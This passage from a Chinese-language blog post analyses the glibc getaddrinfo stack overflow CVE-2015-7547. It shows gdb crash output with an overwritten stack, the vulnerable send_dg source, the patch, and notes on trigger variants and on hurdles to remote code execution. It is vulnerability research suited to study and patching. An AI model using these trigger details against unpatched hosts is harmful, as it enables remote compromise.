0x7ffff7419879 &lt;__GI___libc_res_nquery+1097&gt;:        movzx  ecx,WORD PTR [rbx+0x6]</div><div class=\"line\">   0x7ffff741987d &lt;__GI___libc_res_nquery+1101&gt;:        ror    cx,0x8</div><div class=\"line\">[------------------------------------stack-------------------------------------]</div><div class=\"line\">0000| 0x7fffffffcde0 --&gt; 0x1000001045e </div><div class=\"line\">0008| 0x7fffffffcde8 --&gt; 0x6f6f660300000000 </div><div class=\"line\">0016| 0x7fffffffcdf0 --&gt; 0x6f6f670672616203 </div><div class=\"line\">0024| 0x7fffffffcdf8 --&gt; 0x6d6f6303656c67 </div><div class=\"line\">0032| 0x7fffffffce00 --&gt; 0x1de8c01000100 </div><div class=\"line\">0040| 0x7fffffffce08 --&gt; 0x100 </div><div class=\"line\">0048| 0x7fffffffce10 --&gt; 0x726162036f6f6603 </div><div class=\"line\">0056| 0x7fffffffce18 --&gt; 0x3656c676f6f6706 </div><div class=\"line\">[------------------------------------------------------------------------------]</div><div class=\"line\">Legend: code, data, rodata, value</div><div class=\"line\">Stopped reason: SIGSEGV</div><div class=\"line\">__GI___libc_res_nquery (statp=statp@entry=0x7ffff7ddc080 &lt;_res@GLIBC_2.2.5&gt;, name=0x400717 &quot;foo.bar.google.com&quot;, class=class@entry=0x1, </div><div class=\"line\">    type=type@entry=0xf371, answer=answer@entry=0x7fffffffda40 &quot;\\214\\336&quot;, &apos;B&apos; &lt;repeats 198 times&gt;..., anslen=anslen@entry=0x800, </div><div class=\"line\">    answerp=0x7fffffffe2b0, answerp2=0x7fffffffe2a8, nanswerp2=0x7fffffffe2a4, resplen2=0x7fffffffe2a0) at res_query.c:262</div><div class=\"line\">262             if ((hp-&gt;rcode != NOERROR || ntohs(hp-&gt;ancount) == 0)</div><div class=\"line\">gdb-peda$ bt</div><div class=\"line\">#0  __GI___libc_res_nquery (statp=statp@entry=0x7ffff7ddc080 &lt;_res@GLIBC_2.2.5&gt;, name=0x400717 &quot;foo.bar.google.com&quot;, class=class@entry=0x1, </div><div class=\"line\">    type=type@entry=0xf371, answer=answer@entry=0x7fffffffda40 &quot;\\214\\336&quot;, &apos;B&apos; &lt;repeats 198 times&gt;..., anslen=anslen@entry=0x800, </div><div class=\"line\">    answerp=0x7fffffffe2b0, answerp2=0x7fffffffe2a8, nanswerp2=0x7fffffffe2a4, resplen2=0x7fffffffe2a0) at res_query.c:262</div><div class=\"line\">#1  0x00007ffff7419c47 in __libc_res_nquerydomain (statp=statp@entry=0x7ffff7ddc080 &lt;_res@GLIBC_2.2.5&gt;, name=&lt;optimized out&gt;, </div><div class=\"line\">    name@entry=0x400717 &quot;foo.bar.google.com&quot;, domain=&lt;optimized out&gt;, domain@entry=0x0, class=class@entry=0x1, type=type@entry=0xf371, </div><div class=\"line\">    answer=answer@entry=0x7fffffffda40 &quot;\\214\\336&quot;, &apos;B&apos; &lt;repeats 198 times&gt;..., anslen=0x800, answerp=0x7fffffffe2b0, answerp2=0x7fffffffe2a8, </div><div class=\"line\">    nanswerp2=0x7fffffffe2a4, resplen2=0x7fffffffe2a0) at res_query.c:582</div><div class=\"line\">#2  0x00007ffff7419fbe in __GI___libc_res_nsearch (statp=0x7ffff7ddc080 &lt;_res@GLIBC_2.2.5&gt;, name=name@entry=0x400717 &quot;foo.bar.google.com&quot;, </div><div class=\"line\">    class=class@entry=0x1, type=type@entry=0xf371, answer=answer@entry=0x7fffffffda40 &quot;\\214\\336&quot;, &apos;B&apos; &lt;repeats 198 times&gt;..., </div><div class=\"line\">    anslen=anslen@entry=0x800, answerp=0x7fffffffe2b0, answerp2=0x7fffffffe2a8, nanswerp2=0x7fffffffe2a4, resplen2=0x7fffffffe2a0)</div><div class=\"line\">    at res_query.c:378</div><div class=\"line\">#3  0x00007ffff762b866 in _nss_dns_gethostbyname4_r (name=0x400717 &quot;foo.bar.google.com&quot;, pat=0x4242424242424242, </div><div class=\"line\">    buffer=0x4242424242424242 &lt;error: Cannot access memory at address 0x4242424242424242&gt;, buflen=0x4242424242424242, errnop=0x7fffffffe8ac, herrnop=0x7fffffffe880, ttlp=0x4242424242424242) at nss_dns/dns-host.c:314</div><div class=\"line\">#4  0x4242424242424242 in ?? ()</div><div class=\"line\">#5  0x4242424242424242 in ?? ()</div><div class=\"line\">#6  0x4242424242424242 in ?? ()</div><div class=\"line\">#7  0x4242424242424242 in ?? ()</div><div class=\"line\">#8  0x4242424242424242 in ?? ()</div><div class=\"line\">#9  0x4242424242424242 in ?? ()</div><div class=\"line\">#10 0x4242424242424242 in ?? ()</div><div class=\"line\">#11 0x4242424242424242 in ?? ()</div><div class=\"line\">#12 0x726c424242424242 in ?? ()</div><div class=\"line\">#13 0x000073726574756f in ?? ()</div><div class=\"line\">#14 0x0000000000000000 in ?? ()</div><div class=\"line\">gdb-peda$</div></pre></td></tr></table></figure>\n<h2 id=\"具体分析\"><a href=\"#具体分析\" class=\"headerlink\" title=\"具体分析\"></a>具体分析</h2><p>从gdb看到的调用栈可以看出，崩溃的调用栈是这样的：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div></pre></td><td class=\"code\"><pre><div class=\"line\">getaddrinfo() \t/sysdeps/posix/getaddrinfo.c</div><div class=\"line\">|</div><div class=\"line\">gaih_inet()\t\t/sysdeps/posix/getaddrinfo.c</div><div class=\"line\">|</div><div class=\"line\">gethostbyname4_r()\t/resolv/nss_dns/dns-host.c</div><div class=\"line\">|</div><div class=\"line\">__libc_res_nsearch()\t/resolv/res_query.c</div><div class=\"line\">|</div><div class=\"line\">__libc_res_nquerydomain()\t/resolv/res_query.c</div><div class=\"line\">|</div><div class=\"line\">__libc_res_nquery()\t\t/resolv/res_query.c</div><div class=\"line\">|</div><div class=\"line\">__libc_res_nsend()\t\t/resolv/res_send.c</div><div class=\"line\">|</div><div class=\"line\">send_dg()\t/resolv/res_send.c</div><div class=\"line\">(send_vc()\t/resolv/res_send.c)</div></pre></td></tr></table></figure>\n<p>其中，我们给<code>getaddrinfo</code>函数传入的hints参数中，其ai_family为AF_UNSPEC，这个参数使得<code>getaddrinfo</code>在后来会调用<code>gethostbyname4_r()</code>来进行IPV4与IPV6的DNS的并发查询。我们要关注的重点就是<code>gethostbyname4_r()</code>、<code>__libc_res_nsend()</code>、<code>send_dg()</code>。漏洞发生在<code>send_dg</code>函数中。</p>\n<p>函数调用栈中相关的变量关系大概是这样，我觉得搞明白这些变量的意义对于理解这个洞比较关键，但这些变量命名还是挺乱的，我们之后会逐步理清。另外还有一点是关于DNS的基础也是理解的前题，就是DNS一般来说是使用UDP进行请求与响应的，但是如果数据内容大于512bytes（取决于配置），DNS服务器在返回数据包中将会置位truncated flag，然后client将会重新使用TCP来进行本次DNS请求（当然也可以配置只使用TCP）。</p>\n<p><img src=\"/images/cve_2015_7547_0.png\" alt=\"cve_2015_7547_0.png\"></p>\n<p>首先，<code>gethostbynamr4_r()</code>首先在栈上用alloca分配了2048 bytes的空间，同时也定义了ans2p、nans2p、resplen2，这几个变量是用于标识第二个数据包（因为我们需要发送IPV4和IPV6两个DNS请求，因此是有两个数据包，如果使用TCP的DNS请求的响应也分为两次回应的话）的在buffer中的位置、buffer大小以及对应response的大小。相关代码：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"number\">301</span>   <span class=\"keyword\">union</span></div><div class=\"line\"><span class=\"number\">302</span>   &#123;</div><div class=\"line\"><span class=\"number\">303</span>     querybuf *buf;</div><div class=\"line\"><span class=\"number\">304</span>     u_char *ptr;</div><div class=\"line\"><span class=\"number\">305</span>   &#125; host_buffer;</div><div class=\"line\"><span class=\"number\">306</span>   querybuf *orig_host_buffer;</div><div class=\"line\"><span class=\"number\">307</span>   host_buffer.buf = orig_host_buffer = (querybuf *) alloca (<span class=\"number\">2048</span>); </div><div class=\"line\"><span class=\"number\">308</span>   u_char *ans2p = <span class=\"literal\">NULL</span>;</div><div class=\"line\"><span class=\"number\">309</span>   <span class=\"keyword\">int</span> nans2p = <span class=\"number\">0</span>;</div><div class=\"line\"><span class=\"number\">310</span>   <span class=\"keyword\">int</span> resplen2 = <span class=\"number\">0</span>;</div><div class=\"line\"><span class=\"number\">311</span> </div><div class=\"line\"><span class=\"number\">312</span>   <span class=\"keyword\">int</span> olderr = errno;</div><div class=\"line\"><span class=\"number\">313</span>   <span class=\"keyword\">enum</span> nss_status status;</div><div class=\"line\"><span class=\"number\">314</span>   <span class=\"keyword\">int</span> n = __libc_res_nsearch (&amp;_res, name, C_IN, T_UNSPEC,</div><div class=\"line\"><span class=\"number\">315</span>                   host_buffer.buf-&gt;buf, <span class=\"number\">2048</span>, &amp;host_buffer.ptr,</div><div class=\"line\"><span class=\"number\">316</span>                   &amp;ans2p, &amp;nans2p, &amp;resplen2);</div></pre></td></tr></table></figure>\n<p>之后一路调用到<code>__libc_res_nsend</code>，这个函数用于调用（或者是反复调用）<code>send_dg</code>（处理UDP数据包的发送与接收）与<code>send_vc</code>（处理TCP数据包的发送与接收）来完成DNS查询，也就是说<code>send_dg</code>和<code>send_vc</code>只负责单次的DNS请求（但是这个单次不一定就是只有一个数据包，根据需要IPV4还是IPV6还是都需要来决定 ，如果都需要就会在一次调用中完成IPV4与IPV6数据的请求与接收），如果出了什么问题比如timeout或者truncated都会直接返回由<code>__libc_res_nsend</code>来决定是否继续发送及使用什么方式发送。</p>\n<p>现在我们可以来看<code>send_dg</code>函数中产生漏洞的地方，<code>send_dg</code>函数主要是完成了数据包的发送与接收，漏洞出在接收数据包的代码中，我们可以跳过无关的发送代码。首先是定义了一些局部变量：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"number\">1191</span>         <span class=\"keyword\">int</span> *thisanssizp;</div><div class=\"line\"><span class=\"number\">1192</span>         u_char **thisansp;</div><div class=\"line\"><span class=\"number\">1193</span>         <span class=\"keyword\">int</span> *thisresplenp;</div></pre></td></tr></table></figure>\n<p>这三个变量用于标识用于接收当前数据包（IPV4的或IPV6）的buffer信息，分别是buffer大小、buffer指针、response长度。我们当前的情况是需要接收两个数据包，IPV4的查询响应与IPV6的查询响应，当接收第一个包的时候，if条件满足（buf2指向之前要发送的第二个数据包buffer，这里用来判断是否只需要接收一个包即可），进入这一段：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"number\">1194</span> </div><div class=\"line\"><span class=\"number\">1195</span>         <span class=\"keyword\">if</span> ((recvresp1 | recvresp2) == <span class=\"number\">0</span> || buf2 == <span class=\"literal\">NULL</span>) &#123;</div><div class=\"line\"><span class=\"number\">1196</span>             thisanssizp = anssizp;</div><div class=\"line\"><span class=\"number\">1197</span>             thisansp = anscp ?: ansp;</div><div class=\"line\"><span class=\"number\">1198</span>             assert (anscp != <span class=\"literal\">NULL</span> || ansp2 == <span class=\"literal\">NULL</span>);</div><div class=\"line\"><span class=\"number\">1199</span>             thisresplenp = &amp;resplen;</div><div class=\"line\"><span class=\"number\">1200</span>         &#125; <span class=\"keyword\">else</span> &#123;</div></pre></td></tr></table></figure>\n<p>这一段代码是没有问题的，直接使用了传进来的stack中的2048bytes的buffer去接收数据。但是如果这个2048 bytes的buffer不够，会进入下一段代码使用malloc分配64k的空间进行接收：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"number\">1228</span>         <span class=\"keyword\">if</span> (*thisanssizp &lt; MAXPACKET</div><div class=\"line\"><span class=\"number\">1229</span>             <span class=\"comment\">/* Yes, we test ANSCP here.  If we have two buffers</div><div class=\"line\">1230                both will be allocatable.  */</span></div><div class=\"line\"><span class=\"number\">1231</span>             &amp;&amp; anscp</div><div class=\"line\"><span class=\"number\">1232</span> #ifdef FIONREAD</div><div class=\"line\"><span class=\"number\">1233</span>             &amp;&amp; (ioctl (pfd[<span class=\"number\">0</span>].fd, FIONREAD, thisresplenp) &lt; <span class=\"number\">0</span></div><div class=\"line\"><span class=\"number\">1234</span>             || *thisanssizp &lt; *thisresplenp)</div><div class=\"line\"><span class=\"number\">1235</span> #endif</div><div class=\"line\"><span class=\"number\">1236</span>                     ) &#123;</div><div class=\"line\"><span class=\"number\">1237</span>             u_char *newp = <span class=\"built_in\">malloc</span> (MAXPACKET);</div><div class=\"line\"><span class=\"number\">1238</span>             <span class=\"keyword\">if</span> (newp != <span class=\"literal\">NULL</span>) &#123;</div><div class=\"line\"><span class=\"number\">1239</span>                 *anssizp = MAXPACKET;</div><div class=\"line\"><span class=\"number\">1240</span>                 *thisansp = ans = newp;</div><div class=\"line\"><span class=\"number\">1241</span>             &#125;</div><div class=\"line\"><span class=\"number\">1242</span>         &#125;</div></pre></td></tr></table></figure>\n<p>其实单单看这一段代码是没有问题的，从对这个漏洞的patch也可以看出，只不过是换了一个host_buffer的指针去修改host_bufer指向newp，本质上在这里其实并没有什么改变：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">-\t\t\t\t*anssizp = MAXPACKET;</div><div class=\"line\">-\t\t\t\t*thisansp = ans = newp;</div><div class=\"line\">+\t\t\t\t*thisanssizp = MAXPACKET;</div><div class=\"line\">+\t\t\t\t*thisansp = newp;</div></pre></td></tr></table></figure>\n<p>其实问题是这样产生的，从上面给出的变量图可以看到，这里是想要host_buffer指向新的buffer以及修改anssiz来反映这个buffer的大小变化，然后让<code>__libc_res_nsend</code>中的ans依然指向2048bytes因为如果第二个数据包比较小还依然能存在栈中，这个意图没有问题，实际上问题出在下面的关于准备第二个数据包的buffer相关变量中：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"number\">1200</span>         &#125; <span class=\"keyword\">else</span> &#123;</div><div class=\"line\"><span class=\"number\">1201</span>             <span class=\"keyword\">if</span> (*anssizp != MAXPACKET) &#123;</div><div class=\"line\"><span class=\"number\">1202</span>                 <span class=\"comment\">/* No buffer allocated for the first</div><div class=\"line\">1203                    reply.  We can try to use the rest</div><div class=\"line\">1204                    of the user-provided buffer.  */</span></div><div class=\"line\"><span class=\"number\">1205</span> #ifdef _STRING_ARCH_unaligned</div><div class=\"line\"><span class=\"number\">1206</span>                 *anssizp2 = orig_anssizp - resplen;</div><div class=\"line\"><span class=\"number\">1207</span>                 *ansp2 = *ansp + resplen;</div><div class=\"line\"><span class=\"number\">1208</span> <span class=\"meta\">#<span class=\"meta-keyword\">else</span></span></div><div class=\"line\">...\t\t\t\t\t[...]</div><div class=\"line\"><span class=\"number\">1214</span> <span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></div><div class=\"line\"><span class=\"number\">1215</span>             &#125; <span class=\"keyword\">else</span> &#123;</div><div class=\"line\"><span class=\"number\">1216</span>                 <span class=\"comment\">/* The first reply did not fit into the</div><div class=\"line\">1217                    user-provided buffer.  Maybe the second</div><div class=\"line\">1218                    answer will.  */</span></div><div class=\"line\"><span class=\"number\">1219</span>                 *anssizp2 = orig_anssizp;</div><div class=\"line\"><span class=\"number\">1220</span>                 *ansp2 = *ansp;</div><div class=\"line\"><span class=\"number\">1221</span>             &#125;</div><div class=\"line\"><span class=\"number\">1222</span> </div><div class=\"line\"><span class=\"number\">1223</span>             thisanssizp = anssizp2;</div><div class=\"line\"><span class=\"number\">1224</span>             thisansp = ansp2;</div><div class=\"line\"><span class=\"number\">1225</span>             thisresplenp = resplen2;</div><div class=\"line\"><span class=\"number\">1226</span>         &#125;</div></pre></td></tr></table></figure>\n<p>问题是出在关于orig_anssizp变量的处理上，这个变量是在<code>send_dg</code>一开始这样赋值的：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"number\">1000</span>     <span class=\"keyword\">int</span> orig_anssizp = *anssizp;</div></pre></td></tr></table></figure>\n<p>结合第二个数据包的buffer准备就可以看到问题了，本来用来标识64k的heap中的buffer大小的变量却被用来标志2048bytes的栈buffer的大小，然后传递给<code>recvfrom</code>来接受数据：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"number\">1246</span>         *thisresplenp = recvfrom(pfd[<span class=\"number\">0</span>].fd, (<span class=\"keyword\">char</span>*)*thisansp,</div><div class=\"line\"><span class=\"number\">1247</span>                      *thisanssizp, <span class=\"number\">0</span>,</div><div class=\"line\"><span class=\"number\">1248</span>                     (<span class=\"keyword\">struct</span> sockaddr *)&amp;from, &amp;fromlen);</div></pre></td></tr></table></figure>\n<p>这个时候一旦接个大的数据包就有问题了，stack-overflow就产生了。从patch中也可以证明：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">-\t<span class=\"keyword\">int</span> orig_anssizp = *anssizp;</div></pre></td></tr></table></figure>\n<p>以及</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div></pre></td><td class=\"code\"><pre><div class=\"line\">@@ <span class=\"number\">-1154</span>,<span class=\"number\">50</span> +<span class=\"number\">1123</span>,<span class=\"number\">48</span> @@ send_dg(res_state statp,</div><div class=\"line\"> \t\t\tassert (anscp != <span class=\"literal\">NULL</span> || ansp2 == <span class=\"literal\">NULL</span>);</div><div class=\"line\"> \t\t\tthisresplenp = &amp;resplen;</div><div class=\"line\"> \t\t&#125; <span class=\"keyword\">else</span> &#123;</div><div class=\"line\">-\t\t\t<span class=\"keyword\">if</span> (*anssizp != MAXPACKET) &#123;</div><div class=\"line\">-\t\t\t\t<span class=\"comment\">/* No buffer allocated for the first</div><div class=\"line\">-\t\t\t\t   reply.  We can try to use the rest</div><div class=\"line\">-\t\t\t\t   of the user-provided buffer.  */</span></div><div class=\"line\">-#<span class=\"keyword\">if</span> _STRING_ARCH_unaligned</div><div class=\"line\">-\t\t\t\t*anssizp2 = orig_anssizp - resplen;</div><div class=\"line\">-\t\t\t\t*ansp2 = *ansp + resplen;</div><div class=\"line\">-#<span class=\"keyword\">else</span></div><div class=\"line\">-\t\t\t\t<span class=\"keyword\">int</span> aligned_resplen</div><div class=\"line\">-\t\t\t\t  = ((resplen + __alignof__ (HEADER) - <span class=\"number\">1</span>)</div><div class=\"line\">-\t\t\t\t     &amp; ~(__alignof__ (HEADER) - <span class=\"number\">1</span>));</div><div class=\"line\">-\t\t\t\t*anssizp2 = orig_anssizp - aligned_resplen;</div><div class=\"line\">-\t\t\t\t*ansp2 = *ansp + aligned_resplen;</div><div class=\"line\">-#endif</div><div class=\"line\">-\t\t\t&#125; <span class=\"keyword\">else</span> &#123;</div><div class=\"line\">-\t\t\t\t<span class=\"comment\">/* The first reply did not fit into the</div><div class=\"line\">-\t\t\t\t   user-provided buffer.  Maybe the second</div><div class=\"line\">-\t\t\t\t   answer will.  */</span></div><div class=\"line\">-\t\t\t\t*anssizp2 = orig_anssizp;</div><div class=\"line\">-\t\t\t\t*ansp2 = *ansp;</div><div class=\"line\">-\t\t\t&#125;</div><div class=\"line\">-</div><div class=\"line\"> \t\t\tthisanssizp = anssizp2;</div><div class=\"line\"> \t\t\tthisansp = ansp2;</div><div class=\"line\"> \t\t\tthisresplenp = resplen2;</div><div class=\"line\"> \t\t&#125;</div></pre></td></tr></table></figure>\n<p>可以看出patch的主要思路就是直接删除了在接受第二个数据包的时候对于栈上的buffer的考虑。</p>\n<p><code>send_vc</code>中接受数据包的buffer处理基本和<code>send_dg</code>相同。所以我们也就可以理清POC中的利用思路，首先先是UDP请求IPV4和IPV6的DNS响应，然后服务器返回一个较大的响应包并设置truncated flag，这个时候send_dg中接受到这个包看到TC标志就立刻设置相关变量并返回使得<code>__libc_res_nsend</code>使用<code>send_vc</code>继续（所以我觉得POC中的等到接受到再一次的TCP请求再将之前的UDP包返回来我是没搞明白其意义，这个时候client应该不会再理会这第二个UDP响应了，我尝试修改poc试了一下也确实没有问题，难道poc中这么做只是为了避免client可能的等待？），然后由于orig_anssizp的关系，第一个数据包使用栈中的buffer接受了，但是第二个大数据包到来的时候因为orig_anssizp太大而计算size错误导致了溢出。</p>\n<h2 id=\"还有一些\"><a href=\"#还有一些\" class=\"headerlink\" title=\"还有一些\"></a>还有一些</h2><p>这个漏洞并不止google给出的POC中的一种触发姿势，只要能够先让malloc发生，然后立刻返回再send一次让orig_anssizp被改为64k就可以。比如也可以使用timeout的方式来完成。</p>\n<p>但是POC离对这个CVE的RCE还有些距离，虽然没有canary，但除了要过ASLR和NX保护以外，还要过一些check，在<code>gethostbyname4_r</code>返回前，host_buffer和ans2p这两个变量会被检查是否为null然后交给<code>free()</code>，所以这里是个问题，但也不是不可能的，在特定场景下或者搭配其他漏洞应该是可以过去的，这里还需要进一步折腾。</p>"}],"PostAsset":[],"PostCategory":[],"PostTag":[],"Tag":[]}}